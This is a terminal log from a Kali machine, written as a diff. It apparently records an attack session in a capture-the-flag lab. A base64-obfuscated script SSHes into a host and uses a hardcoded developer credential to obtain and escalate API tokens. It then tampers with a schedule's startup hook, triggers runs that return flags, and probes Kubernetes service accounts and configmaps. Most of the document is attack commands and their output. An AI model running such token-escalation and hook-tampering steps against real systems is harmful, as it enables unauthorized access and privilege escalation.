@@ -1,0 +1,164 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r34.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApLPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0OjY0NDMKVT0icm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIKV1Q9JChjdXJsIC1zU2sgLW0gMTAgLXUgIiRVIiAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2UiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKRUo9JChjdXJsIC1zU2sgLW0gMTAgLVggUE9TVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXVCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3Rva2VuLWV4Y2hhbmdlL2ZpZWxka2VzdC1leHBvcnQtYWNjZXNzIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbjtwcmludChqc29uLmxvYWQoc3lzLnN0ZGluKS5nZXQoImFjY2Vzc190b2tlbiIsIiIpKScpCmcoKXsgbj0iJDEiOyBzaGlmdDsgZWNobyAiIyMjIyMgJG4iOyBjdXJsIC1zU2sgLW0gMjAgLS1jYWNlcnQgJENBIC13ICdcblsle2h0dHBfY29kZX1dXG4nICIkQCIgfCBoZWFkIC1jIDMwMDA7IGVjaG87IH0KZWNobyAiIyMjIyMjIyMjIyBTQ0hFRFVMRSBST1VURVMiCmcgIkdFVCBydW5zIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRCL2FwaS9zY2hlZHVsZXMvU0NIRUQtMjg0MS9ydW5zIgpnICJHRVQgYXR0ZXN0YXRpb24iIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEIvYXBpL3NjaGVkdWxlcy9TQ0hFRC0yODQxL2F0dGVzdGF0aW9uIgpnICJHRVQgc3RhcnR1cCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkQi9hcGkvc2NoZWR1bGVzL1NDSEVELTI4NDEvc3RhcnR1cCIKZyAiR0VUIGhvb2siIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEIvYXBpL3NjaGVkdWxlcy9TQ0hFRC0yODQxL2hvb2siCmcgIlBPU1QgcnVucyB7fSIgLVggUE9TVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3NjaGVkdWxlcy9TQ0hFRC0yODQxL3J1bnMiCmVjaG8gIiMjIyMjIyMjIyMgUEFUQ0ggc2NoZWR1bGUgc3RhcnR1cF9ob29rIChkcnkgYXR0ZW1wdHMgd2l0aCBHRVQgb25seSBmaXJzdCkiCmcgIlBBVENIIHN0YXJ0dXBfaG9vayIgLVggUEFUQ0ggLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7InN0YXJ0dXBfaG9vayI6eyJhcmd2IjpbImZrLXN1cHBvcnQtZXhwb3J0IiwiLS1leHBvcnQiLCJFWFAtMjg0MSJdfX0nICIkQi9hcGkvc2NoZWR1bGVzL1NDSEVELTI4NDEiCmcgIkdFVCBzY2hlZHVsZSBhZnRlciIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkQi9hcGkvc2NoZWR1bGVzL1NDSEVELTI4NDEiCmVjaG8gIiMjIyMjIyMjIyMgUE9TVCBydW5zIHdpdGggc3RhcnR1cCBhcmdzIgpmb3IgYm9keSBpbiAneyJzdGFydHVwX2NvbmZpZyI6IkVYUC0yODQxIn0nICd7InN0YXJ0dXBfaG9vayI6eyJhcmd2IjpbImZrLXN1cHBvcnQtZXhwb3J0IiwiLS1leHBvcnQiLCJFWFAtMjg0MSJdfX0nICd7Im1hcmtlciI6ImNpbmRlciIsInN0YXJ0dXBfY29uZmlnIjoiRVhQLTI4NDEifSc7IGRvCiBnICJQT1NUIHJ1bnMgJGJvZHkiIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICIkYm9keSIgIiRCL2FwaS9zY2hlZHVsZXMvU0NIRUQtMjg0MS9ydW5zIgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgU0NIRURVTEVSIEhPU1RTIgpmb3IgaCBpbiBzY2hlZHVsZXIgZmllbGRrZXN0LXNjaGVkdWxlciB3b3JrbG9hZHMuc2NoZWR1bGVyIHNjaGVkdWxlci5rZXBsZXJvcHMudGVzdDsgZG8KIGVjaG8gIi0tICRoIjsgZ2V0ZW50IGhvc3RzICIkaCIgMj4vZGV2L251bGw7IGdldGVudCBob3N0cyAiJGgua2VwbGVyb3BzLnRlc3QiIDI+L2Rldi9udWxsCmRvbmUKZm9yIGggaW4gc2NoZWR1bGVyLmtlcGxlcm9wcy50ZXN0IGZpZWxka2VzdC1zY2hlZHVsZXIua2VwbGVyb3BzLnRlc3Qgc2NoZWR1bGVyOyBkbwogZyAid2VsbGtub3duICRoIiAiaHR0cHM6Ly8kaC5rZXBsZXJvcHMudGVzdC8ud2VsbC1rbm93bi9maWVsZGtlc3QtY2xpZW50Igpkb25lCmVjaG8gIiMjIyMjIyMjIyMgSldLUyAvIFNBIHRva2VucyBpbiBjbHVzdGVyIChleHBvcnQgY2Fubm90IGNyZWF0ZSB0b2tlbikgLSBsaXN0IFNBcyB2aWEgQVBJPyIKZyAiU0EgbGlzdCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkSy9hcGkvdjEvbmFtZXNwYWNlcy9maWVsZGxpbmsvc2VydmljZWFjY291bnRzIgpnICJDTSBtYWludCBuYW1lcyIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkSy9hcGkvdjEvbmFtZXNwYWNlcy9maWVsZGxpbmsvY29uZmlnbWFwcy9tYWludGVuYW5jZS1mbGstMDEiCmcgIkNNIHBvbGljeS1maWVsZGxpbmstbWFpbnRlbmFuY2UiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEsvYXBpL3YxL25hbWVzcGFjZXMvZmllbGRsaW5rL2NvbmZpZ21hcHMvcG9saWN5LWZpZWxkbGluay1tYWludGVuYW5jZSIKZyAiQ00gbWFpbnQtZmxrLTAxIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRLL2FwaS92MS9uYW1lc3BhY2VzL2ZpZWxkbGluay9jb25maWdtYXBzL21haW50LWZsay0wMSIKZyAiQ00gd29ya2xvYWQtbWFpbnQiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEsvYXBpL3YxL25hbWVzcGFjZXMvZmllbGRsaW5rL2NvbmZpZ21hcHMvd29ya2xvYWQtbWFpbnQtZmxrLTAxIgplY2hvIERPTkVfUjM0ClJTSAplY2hvIEZJTklTSEVECg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r34.sh; bash /tmp/k14_r34.sh; echo DONEMARK_1795208805836$((6*7))
+########## SCHEDULE ROUTES
+##### GET runs
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### GET attestation
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### GET startup
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### GET hook
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### POST runs {}
+{"assignment":"field-operator-b","execution_backend":"isolated-container","flag":"FLAG{ba92d77607f974b5}","run_id":"RUN-3C1FA32A","runtime_identity":"svc-schedule-runner","schedule_id":"SCHED-2841"}
+
+[201]
+
+########## PATCH schedule startup_hook (dry attempts with GET only first)
+##### PATCH startup_hook
+{"schedule_id":"SCHED-2841","startup_hook":{"argv":["fk-support-export","--export","EXP-2841"]}}
+
+[200]
+
+##### GET schedule after
+{"allowed_startup_hooks":[{"argv":["fk-support-export","--export","EXP-2841"]}],"assignment":"field-operator-b","case_id":"CAS-MAYA-2841","cron":"0 8 * * *","destination":"fieldkest-exports","flag":"FLAG{25a027fe80e77ca0}","next_assignment":"field-operator-b","profile":"support-export","schedule_id":"SCHED-2841","schema":"fieldkest.schedule/v1","startup_config":"EXP-2841","startup_hook":null}
+
+[200]
+
+########## POST runs with startup args
+##### POST runs {"startup_config":"EXP-2841"}
+{"assignment":"field-operator-b","execution_backend":"isolated-container","flag":"FLAG{ba92d77607f974b5}","run_id":"RUN-7D11C364","runtime_identity":"svc-schedule-runner","schedule_id":"SCHED-2841"}
+
+[201]
+
+##### POST runs {"startup_hook":{"argv":["fk-support-export","--export","EXP-2841"]}}
+{"assignment":"field-operator-b","execution_backend":"isolated-container","flag":"FLAG{ba92d77607f974b5}","run_id":"RUN-CB4BAEEF","runtime_identity":"svc-schedule-runner","schedule_id":"SCHED-2841"}
+
+[201]
+
+##### POST runs {"marker":"cinder","startup_config":"EXP-2841"}
+{"assignment":"field-operator-b","execution_backend":"isolated-container","flag":"FLAG{ba92d77607f974b5}","run_id":"RUN-523E647B","runtime_identity":"svc-schedule-runner","schedule_id":"SCHED-2841"}
+
+[201]
+
+########## SCHEDULER HOSTS
+-- scheduler
+-- fieldkest-scheduler
+-- workloads.scheduler
+-- scheduler.keplerops.test
+##### wellknown scheduler.keplerops.test
+curl: (6) Could not resolve host: scheduler.keplerops.test.keplerops.test
+
+[000]
+
+##### wellknown fieldkest-scheduler.keplerops.test
+curl: (6) Could not resolve host: fieldkest-scheduler.keplerops.test.keplerops.test
+
+[000]
+
+##### wellknown scheduler
+curl: (6) Could not resolve host: scheduler.keplerops.test
+
+[000]
+
+########## JWKS / SA tokens in cluster (export cannot create token) - list SAs via API?
+##### SA list
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "serviceaccounts is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot list resource \"serviceaccounts\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "serviceaccounts"
+  },
+  "code": 403
+}
+[403]
+
+##### CM maint names
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps \"maintenance-flk-01\" is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot get resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "name": "maintenance-flk-01",
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+[403]
+
+##### CM policy-fieldlink-maintenance
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps \"policy-fieldlink-maintenance\" is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot get resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "name": "policy-fieldlink-maintenance",
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+[403]
+
+##### CM maint-flk-01
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps \"maint-flk-01\" is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot get resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "name": "maint-flk-01",
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+[403]
+
+##### CM workload-maint
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "configmaps \"workload-maint-flk-01\" is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot get resource \"configmaps\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "name": "workload-maint-flk-01",
+    "kind": "configmaps"
+  },
+  "code": 403
+}
+[403]
+
+DONE_R34
+FINISHED
